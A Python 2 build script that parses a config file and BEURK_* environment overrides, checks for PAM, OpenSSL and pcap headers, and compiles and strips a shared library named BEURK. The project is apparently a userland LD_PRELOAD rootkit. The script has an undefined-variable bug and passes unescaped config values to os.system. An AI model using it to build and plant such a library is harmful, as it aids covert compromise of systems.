#!/usr/bin/env python2

import sys, os
from pprint import pprint

# special types for config var values
def type_str(v):
    assert str(v)
    return str(v)

def type_bool(v):
    assert v.lower() in ["true", "false"]
    return True if v.lower() == "true" else False

def type_int(v):
    return int(v)

# the list of config keys (with their associated expected type)
CONFIG_KEYS = {
        "LIBRARY_NAME": type_str,
        "DEBUG_LEVEL": type_int,
        "ENABLE_PTRACE": type_bool,
        "ENABLE_PAM": type_bool,
        "ENABLE_PCAP": type_bool,
        "ENABLE_SSL": type_bool,
        "CC": type_str,
        }


def help():
    """display usage help message and exit
    """
    print("Usage: %s <config-file>" % sys.argv[0])
    sys.exit(1)


def get_config(lines, check_missing_vars=True):
    result = {}
    for lineno, line in enumerate(lines, 1):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if '=' not in line:
            raise SyntaxError("line %d: expected key=val" % lineno)
        key, val = [x.strip() for x in line.split("=", 1)]
        if key in result.keys():
            raise SyntaxError("line %d: %r declared twice" % (lineno, key))
        if key not in CONFIG_KEYS.keys():
            raise SyntaxError("line %d: unknown key: %r" % (lineno, key))
        func_ptr = CONFIG_KEYS[key]
        try:
            val = func_ptr(val)
        except Exception as e:
            func_name = func_ptr.__name__.replace("_", " ")
            msg = "line %d: %r expects %s"
            raise SyntaxError(msg % (lineno, key, func_name))
        result[key] = val
    if check_missing_vars:
        for expected_key in CONFIG_KEYS.keys():
            if expected_key not in result.keys():
                raise SyntaxError("key %r is not defined" % expected_key)

    return result


def check_lib_dependencies():
    """test current system for BEURK dependencies
    """
    deps = {"libpam": "security/pam_appl.h",
            "libssl": "openssl/sha.h",
            "libpcap": "pcap/pcap.h"}
    include_path = [
            "/usr/include",
            "/usr/local/include"]
    missing_deps = 0

    for dep, header in deps.items():
        for include_dir in include_path:
            header_path = os.path.join(include_dir, header)
            if os.path.isfile(header_path):
                break
        else:
            msg = "Dependency not satisfied: %s-dev (header files)."
            sys.stderr.write("%s\n" % msg % dependency)
            missing_deps += 1
    return False if missing_deps else True


###############################################################################
### parse arguments

if len(sys.argv) < 2:
    help()

# read config file
try:
    config_lines = open(sys.argv[1]).read().splitlines()
    config = get_config(config_lines)
except Exception as e:
    sys.stderr.write("config file error: %s:\n" % sys.argv[1])
    sys.exit("-> %s" % e)

# read beurk environment variables
for key, val in os.environ.items():
    if not key.startswith("BEURK_"):
        continue
    try:
        config.update(get_config([key[6:] + "=" + val], False))
    except SyntaxError as e:
        e = str(e)
        if e.startswith("line 1:"):
            e = e[8:]
        errmsg = "environment override error (on %r):\n"
        sys.stderr.write(errmsg % key)
        sys.exit("-> %s" % e)


###############################################################################
### compile library

def run_build_command(cmd):
    cmd = cmd.format(**config)
    print(cmd)
    if os.system(cmd) != 0:
        sys.exit("%s: *** build command failed ***" % sys.argv[0])

SOURCES = [
        "src/beurk.c",
        ]

config["CFLAGS"] = """
-Iincludes -Wall -Wextra
-Wdisabled-optimization -Winline
-Wunsuffixed-float-constants
-Wdouble-promotion -Wunknown-pragmas
-Wno-unknown-warning-option
-mtune=native
""".replace("\n", " ")

config["LDFLAGS"] = "-lc -ldl -lutil "
if config["ENABLE_PAM"]:
    config["LDFLAGS"] += "-lpam "

# build objects from sources
for source in SOURCES:
    dest = source.replace(".c", ".o")
    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))

# build library from objects
objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
run_build_command("{CC} -fPIC -shared -Wl,-soname,{LIBRARY_NAME} " \
        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")

# strip if no debug mode
if config["DEBUG_LEVEL"] == 0:
    run_build_command("strip {LIBRARY_NAME}")
